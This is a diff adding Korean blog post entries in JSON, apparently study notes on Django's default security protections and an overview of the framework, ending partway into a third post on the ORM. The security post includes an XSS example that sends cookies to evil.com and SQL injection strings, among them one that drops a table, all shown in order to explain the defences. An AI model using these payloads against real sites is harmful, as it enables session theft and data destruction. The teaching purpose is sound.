@@ -1,5 +1,137 @@
 [
   {
+    "id": "django-security",
+    "title": "Django 보안 — 기본 탑재된 방어 (CSRF, XSS, SQL Injection, Clickjacking)",
+    "slug": "django-security",
+    "excerpt": "Django의 보안 철학은 \"Secure by Default\" — 아무것도 안 해도 주요 공격이 기본 차단된다. CSRF, XSS, SQL Injection, Clickjacking 각각을 어떻게 막는지 동작 원리까지 설명한다.",
+    "content": "<h2>왜 Django가 &quot;Secure by Default&quot;인가</h2>\n<p>웹 보안에서 가장 무서운 건 &quot;내가 모르는 취약점&quot;이다.<br>OWASP Top 10 중 상당수가 개발자가 직접 방어 코드를 작성하지 않아 생기는 실수다.</p>\n<p>Django의 철학: <strong>개발자가 아무것도 안 해도 주요 공격이 기본 차단되어야 한다.</strong><sup id=\"fnref-django-security-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-django-security-docs\" aria-label=\"각주 1\">[1]</a></sup></p>\n<pre><code class=\"language-mermaid\">%% desc: Django가 기본 탑재된 방어로 OWASP Top 10 주요 항목을 막는 구조\nflowchart TD\n  ATTACKS[&quot;주요 웹 공격&quot;]\n\n  A1[&quot;CSRF\\n(Cross-Site Request Forgery)&quot;]\n  A2[&quot;XSS\\n(Cross-Site Scripting)&quot;]\n  A3[&quot;SQL Injection&quot;]\n  A4[&quot;Clickjacking&quot;]\n  A5[&quot;HTTPS 미적용\\n세션 하이재킹&quot;]\n\n  D1[&quot;CsrfViewMiddleware\\n+ csrf_token 태그&quot;]\n  D2[&quot;DTL 자동 이스케이프\\n기본 ON&quot;]\n  D3[&quot;ORM 파라미터화\\n항상 적용&quot;]\n  D4[&quot;XFrameOptionsMiddleware\\nX-Frame-Options: DENY&quot;]\n  D5[&quot;SecurityMiddleware\\nSSL 리디렉션 + HSTS&quot;]\n\n  ATTACKS --&gt; A1 &amp; A2 &amp; A3 &amp; A4 &amp; A5\n  A1 --&gt; D1\n  A2 --&gt; D2\n  A3 --&gt; D3\n  A4 --&gt; D4\n  A5 --&gt; D5\n\n  style D1 fill:#16a34a,color:#fff\n  style D2 fill:#16a34a,color:#fff\n  style D3 fill:#16a34a,color:#fff\n  style D4 fill:#16a34a,color:#fff\n  style D5 fill:#16a34a,color:#fff\n</code></pre>\n<h2>1. CSRF 방어</h2>\n<p><strong>CSRF(Cross-Site Request Forgery)</strong>: 사용자가 로그인된 상태에서 악성 사이트가 사용자 대신 요청을 보내는 공격이다.</p>\n<h3>공격 시나리오</h3>\n<pre><code class=\"language-mermaid\">%% desc: CSRF 공격 흐름 — 악성 사이트가 로그인된 사용자의 세션을 이용해 서버에 요청\nsequenceDiagram\n  participant USER as 사용자\n  participant BANK as 은행 (bank.com)\n  participant EVIL as 악성 사이트 (evil.com)\n\n  USER-&gt;&gt;BANK: 로그인 ✅ (세션 쿠키 저장됨)\n  USER-&gt;&gt;EVIL: 방문 (링크 클릭)\n  EVIL-&gt;&gt;EVIL: 숨겨진 폼 자동 제출 코드 실행\n  EVIL-&gt;&gt;BANK: POST /transfer?to=hacker&amp;amount=100만원\\n(사용자 세션 쿠키 자동 포함)\n  BANK-&gt;&gt;BANK: 세션 유효 → 요청 처리!\n  Note over BANK: 사용자 모르게 송금됨 😱\n</code></pre>\n<h3>Django의 방어 방법</h3>\n<p><code>CsrfViewMiddleware</code>가 모든 POST 요청에 CSRF 토큰을 검증한다.<sup id=\"fnref-csrf-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-csrf-docs\" aria-label=\"각주 2\">[2]</a></sup></p>\n<pre><code class=\"language-django\">{# Template에서 #}\n&lt;form method=&quot;post&quot; action=&quot;/transfer/&quot;&gt;\n  {% csrf_token %}  {# ← 숨겨진 input 필드로 토큰 삽입 #}\n  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;\n  &lt;button type=&quot;submit&quot;&gt;송금&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>\n<p>렌더링 결과:</p>\n<pre><code class=\"language-html\">&lt;form method=&quot;post&quot; action=&quot;/transfer/&quot;&gt;\n  &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;abc123xyz...&quot;&gt;\n  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;\n  &lt;button type=&quot;submit&quot;&gt;송금&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>\n<pre><code class=\"language-mermaid\">%% desc: CSRF 토큰이 요청 검증을 통과시키는 동작 — 악성 사이트는 토큰을 모름\nsequenceDiagram\n  participant USER as 사용자\n  participant DJANGO as Django\n  participant EVIL as 악성 사이트\n\n  USER-&gt;&gt;DJANGO: GET /transfer/ 페이지 요청\n  DJANGO--&gt;&gt;USER: HTML + csrftoken=abc123\n\n  alt 정상 요청\n    USER-&gt;&gt;DJANGO: POST /transfer/ + csrftoken=abc123\n    DJANGO-&gt;&gt;DJANGO: 토큰 검증 ✅ → 처리\n  end\n\n  alt CSRF 공격 시도\n    EVIL-&gt;&gt;DJANGO: POST /transfer/ (토큰 없음 / 다른 토큰)\n    DJANGO-&gt;&gt;DJANGO: 토큰 검증 ❌\n    DJANGO--&gt;&gt;EVIL: 403 Forbidden\n  end\n</code></pre>\n<p>악성 사이트는 다른 도메인이라 <code>abc123</code> 토큰 값을 알 수 없다. 토큰 없이 POST를 보내면 403 Forbidden이다.</p>\n<h3>AJAX에서 CSRF 처리</h3>\n<pre><code class=\"language-javascript\">// fetch API에서 CSRF 토큰 전송\nconst csrfToken = document.cookie\n  .split(&quot;;&quot;)\n  .find(c =&gt; c.trim().startsWith(&quot;csrftoken=&quot;))\n  ?.split(&quot;=&quot;)[1];\n\nfetch(&quot;/api/transfer/&quot;, {\n  method: &quot;POST&quot;,\n  headers: {\n    &quot;Content-Type&quot;: &quot;application/json&quot;,\n    &quot;X-CSRFToken&quot;: csrfToken,     // ← 헤더로 전송\n  },\n  body: JSON.stringify({ amount: 10000 }),\n});\n</code></pre>\n<p>Django 4.0부터 로그인 시 CSRF 토큰이 자동 갱신된다.</p>\n<h2>2. XSS 방어</h2>\n<p><strong>XSS(Cross-Site Scripting)</strong>: 사용자 입력에 포함된 JavaScript가 다른 사용자의 브라우저에서 실행되는 공격이다.</p>\n<h3>공격 시나리오</h3>\n<pre><code>공격자가 댓글 입력:\n&lt;script&gt;document.location=&#39;https://evil.com/steal?c=&#39;+document.cookie&lt;/script&gt;\n\n이 댓글이 저장되고 다른 사용자가 페이지를 열면\n쿠키가 evil.com으로 전송됨 😱\n</code></pre>\n<h3>Django의 방어 방법</h3>\n<p>DTL은 <strong>모든 변수를 기본으로 HTML 이스케이프</strong>한다.<sup id=\"fnref-xss-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-xss-docs\" aria-label=\"각주 3\">[3]</a></sup></p>\n<pre><code class=\"language-django\">{# 공격자 입력: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; #}\n{{ comment.text }}\n\n{# 렌더링 결과: #}\n&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;\n{# 브라우저는 이것을 텍스트로만 표시. 실행 안 됨. #}\n</code></pre>\n<p>이스케이프 변환 규칙:</p>\n<table>\n<thead>\n<tr>\n<th>문자</th>\n<th>이스케이프</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>&lt;</code></td>\n<td><code>&amp;lt;</code></td>\n</tr>\n<tr>\n<td><code>&gt;</code></td>\n<td><code>&amp;gt;</code></td>\n</tr>\n<tr>\n<td><code>&#39;</code></td>\n<td><code>&amp;#x27;</code></td>\n</tr>\n<tr>\n<td><code>&quot;</code></td>\n<td><code>&amp;quot;</code></td>\n</tr>\n<tr>\n<td><code>&amp;</code></td>\n<td><code>&amp;amp;</code></td>\n</tr>\n</tbody></table>\n<p>개발자가 의도적으로 HTML을 그대로 출력하려면 명시적으로 safe 선언이 필요하다:</p>\n<pre><code class=\"language-django\">{{ content|safe }}        {# ← 명시적 비활성화. 신뢰할 수 있는 콘텐츠에만 사용 #}\n{% autoescape off %}\n  {{ trusted_html }}\n{% endautoescape %}\n</code></pre>\n<p><code>|safe</code>를 사용자 입력에 적용하면 즉시 XSS 취약점이 된다.</p>\n<h2>3. SQL Injection 방어</h2>\n<p><strong>SQL Injection</strong>: 사용자 입력을 SQL에 직접 삽입해 쿼리를 조작하는 공격이다.</p>\n<h3>공격 시나리오</h3>\n<pre><code class=\"language-python\"># 절대 이렇게 하면 안 되는 코드\nusername = request.GET.get(&quot;username&quot;)\nUser.objects.raw(f&quot;SELECT * FROM users WHERE username = &#39;{username}&#39;&quot;)\n\n# 공격자가 username에 입력:\n# &#39; OR &#39;1&#39;=&#39;1\n# 완성된 SQL:\n# SELECT * FROM users WHERE username = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;\n# → 모든 유저 조회됨!\n\n# 더 심한 경우:\n# &#39;; DROP TABLE users; --\n</code></pre>\n<h3>Django의 방어 방법</h3>\n<p>Django ORM은 <strong>쿼리 파라미터화(Query Parameterization)</strong>를 사용한다.<sup id=\"fnref-sql-injection-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-sql-injection-docs\" aria-label=\"각주 4\">[4]</a></sup></p>\n<pre><code class=\"language-python\"># Django ORM은 항상 안전\nusername = request.GET.get(&quot;username&quot;)\nUser.objects.filter(username=username)\n\n# 내부적으로 DB 드라이버에게 이렇게 전달됨:\n# SQL: SELECT * FROM users WHERE username = %s\n# 파라미터: [&#39;사용자_입력값&#39;]\n# DB가 파라미터를 SQL 코드가 아닌 데이터로 처리\n</code></pre>\n<pre><code class=\"language-mermaid\">%% desc: 파라미터화된 쿼리가 SQL Injection을 막는 원리 — 입력값이 SQL 코드가 아닌 데이터로 처리\nflowchart LR\n  subgraph VULNERABLE[&quot;❌ 취약한 방식 (문자열 조합)&quot;]\n    V1[&quot;SQL = &#39;WHERE username = &#39; + 입력값&quot;]\n    V2[&quot;입력값이 SQL 코드가 됨&quot;]\n    V3[&quot;&#39; OR &#39;1&#39;=&#39;1 → 모든 유저 노출!&quot;]\n    V1 --&gt; V2 --&gt; V3\n  end\n\n  subgraph SAFE[&quot;✅ 파라미터화 (Django ORM)&quot;]\n    S1[&quot;SQL = &#39;WHERE username = %s&#39;&quot;]\n    S2[&quot;파라미터 = [&#39;입력값&#39;]&quot;]\n    S3[&quot;DB가 입력값을 데이터로만 처리&quot;]\n    S4[&quot;SQL 조작 불가능&quot;]\n    S1 &amp; S2 --&gt; S3 --&gt; S4\n  end\n</code></pre>\n<p>Raw SQL을 써야 할 때도 반드시 파라미터를 분리해야 한다:</p>\n<pre><code class=\"language-python\"># ❌ 위험 — 절대 사용 금지\ncursor.execute(f&quot;SELECT * FROM users WHERE username = &#39;{username}&#39;&quot;)\n\n# ✅ 안전 — 파라미터 분리\ncursor.execute(&quot;SELECT * FROM users WHERE username = %s&quot;, [username])\n</code></pre>\n<h2>4. Clickjacking 방어</h2>\n<p><strong>Clickjacking</strong>: 악성 사이트가 투명한 <code>&lt;iframe&gt;</code>으로 대상 사이트를 덮어씌워 사용자가 자신도 모르게 클릭하게 만드는 공격이다.</p>\n<pre><code class=\"language-mermaid\">%% desc: Clickjacking 공격 — 투명 iframe으로 실제 버튼 위에 가짜 UI를 씌우는 수법\nflowchart TD\n  subgraph EVIL_PAGE[&quot;악성 사이트 (evil.com)&quot;]\n    FAKE_BTN[&quot;&#39;무료 게임 시작&#39; 버튼\\n(사용자에게 보임)&quot;]\n    IFRAME[&quot;투명 iframe\\n(bank.com/transfer)\\n사용자에게 안 보임&quot;]\n    OVERLAP[&quot;투명 iframe이 가짜 버튼 위에 겹쳐있음&quot;]\n    FAKE_BTN --&gt; OVERLAP\n    IFRAME --&gt; OVERLAP\n  end\n\n  USER[&quot;사용자가 &#39;무료 게임 시작&#39; 클릭&quot;]\n  REAL_ACTION[&quot;실제로는 bank.com 송금 버튼 클릭됨!&quot;]\n\n  USER --&gt; OVERLAP --&gt; REAL_ACTION\n</code></pre>\n<h3>Django의 방어 방법</h3>\n<p><code>XFrameOptionsMiddleware</code>가 <code>X-Frame-Options</code> 헤더를 설정한다.<sup id=\"fnref-clickjacking-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-clickjacking-docs\" aria-label=\"각주 5\">[5]</a></sup></p>\n<pre><code class=\"language-python\"># settings.py 기본값\nX_FRAME_OPTIONS = &quot;DENY&quot;  # 어떤 사이트에서도 iframe으로 포함 불가\n# X_FRAME_OPTIONS = &quot;SAMEORIGIN&quot;  # 같은 도메인에서만 iframe 허용\n</code></pre>\n<pre><code>HTTP Response 헤더:\nX-Frame-Options: DENY\n</code></pre>\n<p>브라우저는 이 헤더를 보고 iframe 렌더링을 거부한다.</p>\n<p>특정 View에서만 iframe을 허용하려면:</p>\n<pre><code class=\"language-python\">from django.views.decorators.clickjacking import xframe_options_sameorigin, xframe_options_exempt\n\n@xframe_options_sameorigin   # 같은 도메인에서만 허용\ndef embed_widget(request):\n    ...\n\n@xframe_options_exempt        # iframe 완전 허용 (위험! 신중하게)\ndef public_embed(request):\n    ...\n</code></pre>\n<h2>5. HTTPS / HSTS</h2>\n<p><code>SecurityMiddleware</code>(미들웨어 스택 첫 번째)가 담당한다.<sup id=\"fnref-https-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-https-docs\" aria-label=\"각주 6\">[6]</a></sup></p>\n<pre><code class=\"language-python\"># settings.py (운영 환경)\nSECURE_SSL_REDIRECT = True          # HTTP → HTTPS 자동 리디렉션\nSECURE_HSTS_SECONDS = 31536000      # HSTS: 1년간 HTTPS 강제\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True  # 서브도메인 포함\nSECURE_HSTS_PRELOAD = True          # 브라우저 preload 목록 등록\nSESSION_COOKIE_SECURE = True        # 세션 쿠키를 HTTPS에서만 전송\nCSRF_COOKIE_SECURE = True           # CSRF 쿠키를 HTTPS에서만 전송\n</code></pre>\n<p><strong>HSTS 주의사항</strong>: <code>SECURE_HSTS_SECONDS</code>를 한 번 설정하면 그 기간 동안 브라우저가 해당 도메인을 무조건 HTTPS로만 접근한다. HTTP로 되돌릴 수 없다. 먼저 짧은 값(300초)으로 테스트 후 늘려가는 것을 권장한다.</p>\n<h2>보안 체크 명령</h2>\n<p>Django는 보안 설정을 자동으로 검사해준다:</p>\n<pre><code class=\"language-bash\"># 보안 설정 점검 (배포 전 반드시 실행)\npython manage.py check --deploy\n\n# 출력 예시:\n# WARNINGS:\n# ?: (security.W004) You have not set a value for the SECURE_HSTS_SECONDS setting.\n# ?: (security.W008) Your SECRET_KEY has less than 50 characters.\n# ERRORS:\n# ?: (security.E010) DEBUG is True — should be False in production\n</code></pre>\n<h2>보안 설정 요약</h2>\n<pre><code class=\"language-python\"># settings/production.py — 운영 환경 보안 설정 체크리스트\nDEBUG = False\nSECRET_KEY = env(&quot;DJANGO_SECRET_KEY&quot;)      # 50자 이상 랜덤 문자열\nALLOWED_HOSTS = env.list(&quot;DJANGO_ALLOWED_HOSTS&quot;)\n\n# HTTPS / HSTS\nSECURE_SSL_REDIRECT = True\nSECURE_HSTS_SECONDS = 31536000\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True\nSECURE_HSTS_PRELOAD = True\n\n# Cookies\nSESSION_COOKIE_SECURE = True\nCSRF_COOKIE_SECURE = True\nSESSION_COOKIE_HTTPONLY = True   # JS에서 세션 쿠키 접근 불가\n\n# Clickjacking\nX_FRAME_OPTIONS = &quot;DENY&quot;\n\n# Content Security Policy (선택, 추가 XSS 방어)\n# pip install django-csp\nCSP_DEFAULT_SRC = (&quot;&#39;self&#39;&quot;,)\n</code></pre>\n<h2>관련 글</h2>\n<ul>\n<li><a href=\"/post/django-overview\">Django 프레임워크 큰 그림</a>: 보안을 포함한 Django 전체 구조</li>\n<li><a href=\"/post/django-lifecycle\">Django 요청-응답 라이프사이클</a>: 미들웨어 스택에서 보안이 적용되는 위치</li>\n<li><a href=\"/post/django-orm-deep\">Django ORM 심층</a>: SQL Injection 방어의 실제 구현인 파라미터화된 쿼리</li>\n</ul>\n<hr>\n<h2>참고/주석</h2>\n<ol>\n<li id=\"fn-django-security-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/security/\" target=\"_blank\">Security in Django — Django Docs</a> <a href=\"#fnref-django-security-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-csrf-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/ref/csrf/\" target=\"_blank\">Cross Site Request Forgery protection — Django Docs</a> <a href=\"#fnref-csrf-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-xss-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/security/#cross-site-scripting-xss-protection\" target=\"_blank\">XSS protection — Django Docs</a> <a href=\"#fnref-xss-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-sql-injection-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/security/#sql-injection-protection\" target=\"_blank\">SQL injection protection — Django Docs</a> <a href=\"#fnref-sql-injection-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-clickjacking-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/ref/clickjacking/\" target=\"_blank\">Clickjacking Protection — Django Docs</a> <a href=\"#fnref-clickjacking-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-https-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/security/#ssl-https\" target=\"_blank\">SSL/HTTPS — Django Docs</a> <a href=\"#fnref-https-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n</ol>\n",
+    "coverImage": null,
+    "category": "study/backend/django",
+    "tags": [
+      "Django",
+      "Security",
+      "CSRF",
+      "XSS",
+      "SQLInjection",
+      "Clickjacking",
+      "HTTPS",
+      "HSTS",
+      "SecureByDefault"
+    ],
+    "author": "Seobway",
+    "readTime": 13,
+    "views": 0,
+    "featured": false,
+    "createdAt": "2026-03-27T00:00:00.000Z",
+    "updatedAt": "2026-03-27T03:51:25.149Z"
+  },
+  {
+    "id": "django-overview",
+    "title": "Django 프레임워크 큰 그림 — 철학, 구조, 핵심 개념 한눈에",
+    "slug": "django-overview",
+    "excerpt": "Django가 어떤 철학으로 설계됐는지, MTV 패턴이 MVC와 어떻게 다른지, Batteries Included가 실제로 무엇을 의미하는지 — 큰 틀에서 Django를 한 번에 이해한다.",
+    "content": "<h2>Django란 무엇인가</h2>\n<p>2003년 미국 신문사 <strong>Lawrence Journal-World</strong>의 Adrian Holovaty와 Simon Willison이 만든 Python 웹 프레임워크다.<sup id=\"fnref-django-history\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-django-history\" aria-label=\"각주 1\">[1]</a></sup></p>\n<p>태그라인: <strong>&quot;The web framework for perfectionists with deadlines&quot;</strong><br>마케팅 문구가 아니다. 신문사 마감이라는 실제 압박에서 나온 말이다. 완벽하게 만들어야 하지만 지금 당장 나가야 한다 — 그 긴장감이 Django의 설계 방향을 만들었다.</p>\n<pre><code class=\"language-mermaid\">%% desc: Django의 핵심 구성요소가 settings.py를 중심으로 연결되는 전체 구조\nflowchart TD\n  SETTINGS[&quot;settings.py\\n(모든 설정의 허브)&quot;]\n\n  IA[&quot;INSTALLED_APPS\\n앱 등록&quot;]\n  MW[&quot;MIDDLEWARE\\n요청/응답 파이프라인&quot;]\n  UC[&quot;ROOT_URLCONF\\nURL 라우팅&quot;]\n  DB[&quot;DATABASES\\nDB 연결&quot;]\n  TPL[&quot;TEMPLATES\\n템플릿 엔진&quot;]\n\n  SETTINGS --&gt; IA &amp; MW &amp; UC &amp; DB &amp; TPL\n\n  IA --&gt; ORM[&quot;ORM (QuerySet, Model)&quot;]\n  IA --&gt; ADMIN[&quot;Admin 자동 생성&quot;]\n  IA --&gt; MIGRATIONS[&quot;Migration 이력&quot;]\n\n  MW --&gt; SECURITY[&quot;보안 레이어\\nCSRF·XSS·Clickjacking&quot;]\n  UC --&gt; VIEWS[&quot;View (요청 처리)&quot;]\n  VIEWS --&gt; ORM\n  VIEWS --&gt; TPL\n</code></pre>\n<h2>Django의 7가지 설계 철학</h2>\n<p>2005년 오픈소스 공개 당시부터 공식 문서에 명시된 원칙들이다.<sup id=\"fnref-design-philosophies\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-design-philosophies\" aria-label=\"각주 2\">[2]</a></sup></p>\n<h3>1. DRY — Don&#39;t Repeat Yourself</h3>\n<p>&quot;모든 개념과 데이터는 단 한 곳에만 존재해야 한다.&quot;</p>\n<p>실제 적용:</p>\n<pre><code class=\"language-python\"># 모델을 한 번 정의하면...\nclass Article(models.Model):\n    title = models.CharField(max_length=200)\n    body = models.TextField()\n    published_at = models.DateTimeField()\n\n# Admin 인터페이스가 자동 생성됨\n# Form 검증 로직이 자동 파생됨\n# Migration 파일이 자동 생성됨\n# REST API 시리얼라이저도 ModelSerializer로 자동 파생됨\n</code></pre>\n<h3>2. Loose Coupling (느슨한 결합)</h3>\n<p>각 레이어는 서로를 모른다:</p>\n<ul>\n<li>Template은 DB를 모른다</li>\n<li>DB 레이어는 화면을 모른다</li>\n<li>View는 어떤 Template 엔진이 쓰이는지 신경 안 쓴다</li>\n</ul>\n<p>이것이 Template 엔진을 DTL에서 Jinja2로 교체할 수 있는 이유다.</p>\n<h3>3. Explicit is Better than Implicit</h3>\n<p>Python의 <code>import this</code>에서 직접 가져온 원칙이다.</p>\n<pre><code class=\"language-python\"># Django는 이렇게 하지 않는다 (암묵적 자동 저장)\narticle.title = &quot;새 제목&quot;\n# 자동으로 DB에 저장되면 위험\n\n# Django는 이렇게 한다 (명시적 저장)\narticle.title = &quot;새 제목&quot;\narticle.save()  # 개발자가 명시해야만 저장됨\n</code></pre>\n<p>뒤에서 몰래 일어나는 일이 없다.</p>\n<h3>4. Less Code + Fast Development</h3>\n<p>&quot;웹 프레임워크의 핵심은 반복적인 작업을 빠르게 만드는 것이다.&quot;</p>\n<p>보일러플레이트를 최대한 없애고, 같은 기능을 가장 짧은 코드로 표현할 수 있도록 설계됐다.</p>\n<h3>5. Batteries Included</h3>\n<p>Python의 철학을 그대로 가져왔다. 외부 라이브러리 없이 웬만한 웹 기능이 기본 포함됐다.</p>\n<pre><code class=\"language-mermaid\">%% desc: Django에 기본 포함된 Batteries Included 구성요소\nflowchart LR\n  DJANGO[&quot;Django&quot;]\n\n  ORM[&quot;ORM\\n데이터베이스 추상화&quot;]\n  ADMIN[&quot;Admin\\n자동 관리 UI&quot;]\n  AUTH[&quot;Auth\\n인증·권한·세션&quot;]\n  FORMS[&quot;Forms\\n입력 검증·렌더링&quot;]\n  CACHE[&quot;Cache\\nRedis·Memcached 지원&quot;]\n  I18N[&quot;i18n\\n다국어 지원&quot;]\n  STATIC[&quot;Staticfiles\\n정적 파일 관리&quot;]\n  SIGNALS[&quot;Signals\\n이벤트 알림&quot;]\n  MIGRATIONS[&quot;Migrations\\n스키마 이력 관리&quot;]\n\n  DJANGO --&gt; ORM &amp; ADMIN &amp; AUTH &amp; FORMS &amp; CACHE &amp; I18N &amp; STATIC &amp; SIGNALS &amp; MIGRATIONS\n</code></pre>\n<h3>6. Clean URL</h3>\n<p>URL은 깔끔해야 한다. <code>.php</code>, <code>?id=123</code>, <code>.asp</code> 같은 구현 세부사항을 URL에 노출하지 않는다.</p>\n<pre><code class=\"language-python\"># Django URL 설계 — 완전한 자유\nurlpatterns = [\n    path(&quot;articles/&lt;int:year&gt;/&lt;slug:slug&gt;/&quot;, views.article_detail),\n    path(&quot;users/@&lt;str:username&gt;/&quot;, views.profile),\n]\n</code></pre>\n<h3>7. 일관성 (Consistency)</h3>\n<p>QuerySet API, URL 리졸버, 템플릿 태그, 관리 명령어 — 모두 일관된 네이밍과 동작 규칙을 따른다.</p>\n<h2>MTV — Django의 아키텍처 패턴</h2>\n<p>Django는 MVC가 아니라 <strong>MTV (Model-Template-View)</strong>다.</p>\n<table>\n<thead>\n<tr>\n<th>MVC</th>\n<th>Django MTV</th>\n<th>역할</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Model</td>\n<td><strong>Model</strong></td>\n<td>데이터 구조 + 비즈니스 로직 + DB 매핑</td>\n</tr>\n<tr>\n<td>View</td>\n<td><strong>Template</strong></td>\n<td>화면 렌더링 (HTML 생성)</td>\n</tr>\n<tr>\n<td>Controller</td>\n<td><strong>View</strong></td>\n<td>요청 처리, 데이터 선택, 응답 생성</td>\n</tr>\n<tr>\n<td>(없음)</td>\n<td><strong>URL Dispatcher</strong></td>\n<td>URL → View 연결 (Django에서 독립 레이어)</td>\n</tr>\n</tbody></table>\n<p>Django 공식 FAQ: <em>&quot;Django appears to be an MVC framework, but it calls the Controller the &#39;view&#39;, and the View the &#39;template&#39;.&quot;</em><sup id=\"fnref-django-faq\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-django-faq\" aria-label=\"각주 3\">[3]</a></sup></p>\n<p>URL Dispatcher를 별도 레이어로 분리한 점이 Django의 특징이다. 고전 MVC에서 Controller 안에 묻혀있던 라우팅을 독립시켜 URL 설계를 완전히 자유롭게 만들었다.</p>\n<h2>Project vs App — Django의 모듈화 단위</h2>\n<pre><code class=\"language-mermaid\">%% desc: Django Project는 전체 웹사이트, App은 독립적인 기능 단위\nflowchart TD\n  PROJECT[&quot;Django Project\\n(전체 웹사이트)&quot;]\n\n  SETTINGS[&quot;settings.py\\n모든 설정의 진입점&quot;]\n  URLS[&quot;urls.py (root)\\nURL 라우팅 최상단&quot;]\n  WSGI[&quot;wsgi.py / asgi.py\\n서버 진입점&quot;]\n\n  PROJECT --&gt; SETTINGS &amp; URLS &amp; WSGI\n\n  APP1[&quot;App: blog\\n블로그 기능\\nmodels/views/urls/templates&quot;]\n  APP2[&quot;App: accounts\\n계정 관리&quot;]\n  APP3[&quot;App: shop\\n쇼핑 기능&quot;]\n\n  PROJECT --&gt; APP1 &amp; APP2 &amp; APP3\n\n  NOTE[&quot;앱은 독립적·이식 가능\\n다른 프로젝트에 복사해서 바로 사용 가능&quot;]\n  APP1 -.-&gt; NOTE\n</code></pre>\n<ul>\n<li><strong>Project</strong>: 웹사이트 전체. <code>settings.py</code>, <code>manage.py</code>, root <code>urls.py</code> 포함. 보통 하나.</li>\n<li><strong>App</strong>: 특정 기능을 담당하는 독립 단위. 한 프로젝트에 여러 앱. <strong>한 앱이 여러 프로젝트에서 재사용 가능</strong>.</li>\n</ul>\n<h2>각 개념 심층 탐구</h2>\n<p>이 개요를 바탕으로 각 주제를 더 깊이 알고 싶다면:</p>\n<h2>관련 글</h2>\n<ul>\n<li><a href=\"/post/django-lifecycle\">Django 요청-응답 라이프사이클</a>: HTTP 요청이 Django를 통과하는 전체 흐름 — Middleware → URL → View → ORM → Template</li>\n<li><a href=\"/post/django-architecture\">Django MTV 아키텍처와 앱 구조</a>: MTV 패턴 심층, Project vs App, settings.py의 역할, WSGI vs ASGI</li>\n<li><a href=\"/post/django-orm-deep\">Django ORM — QuerySet과 지연 실행</a>: Active Record 패턴, QuerySet 지연 실행, Manager, N+1 문제</li>\n<li><a href=\"/post/django-security\">Django 보안 — 기본 탑재된 방어</a>: CSRF, XSS, SQL Injection, Clickjacking 각각 어떻게 막는가</li>\n</ul>\n<hr>\n<h2>참고/주석</h2>\n<ol>\n<li id=\"fn-django-history\" style=\"scroll-margin-top: 96px;\">Simon Willison, <a href=\"https://simonwillison.net/2005/Jul/17/django/\" target=\"_blank\">Introducing Django (2005)</a> <a href=\"#fnref-django-history\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-design-philosophies\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/misc/design-philosophies/\" target=\"_blank\">Design philosophies — Django Docs</a> <a href=\"#fnref-design-philosophies\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-django-faq\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/faq/general/\" target=\"_blank\">FAQ: General — Django Docs</a> <a href=\"#fnref-django-faq\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n</ol>\n",
+    "coverImage": null,
+    "category": "study/backend",
+    "tags": [
+      "Django",
+      "MTV",
+      "Architecture",
+      "Philosophy",
+      "DRY",
+      "BatteriesIncluded",
+      "ORM",
+      "Middleware",
+      "Python"
+    ],
+    "author": "Seobway",
+    "readTime": 13,
+    "views": 0,
+    "featured": false,
+    "createdAt": "2026-03-27T00:00:00.000Z",
+    "updatedAt": "2026-03-27T03:51:25.152Z"
+  },
+  {
+    "id": "django-orm-deep",
+    "title": "Django ORM 심층 — QuerySet 지연 실행, Manager, Active Record",
+    "slug": "django-orm-deep",
+    "excerpt": "Django ORM의 핵심인 QuerySet 지연 실행(Lazy Evaluation)이 어떻게 동작하는지, Manager 패턴으로 테이블 레벨 로직을 캡슐화하는 방법, N+1 문제와 해결법을 설명한다.",
